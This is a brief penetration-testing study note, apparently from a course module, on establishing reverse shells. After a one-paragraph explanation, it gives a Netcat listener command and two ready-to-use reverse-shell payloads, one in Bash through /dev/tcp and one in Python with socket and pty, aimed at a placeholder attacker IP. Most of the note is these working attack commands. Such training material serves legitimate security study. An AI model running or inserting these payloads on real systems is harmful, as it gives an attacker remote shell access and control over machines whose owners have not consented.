# 04-10: Establishing Reverse Shells

## Overview
A reverse shell is a type of shell connection where the target machine initiates a connection back to the attacker's machine. This is often used to bypass firewalls that block incoming connections.

## Listeners
On Kali, use Netcat to listen for incoming connections:
`nc -lvnp 4444`

## Common Payloads
- **Bash**: `bash -i >& /dev/tcp/<ip>/4444 0>&1`
- **Python**: `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
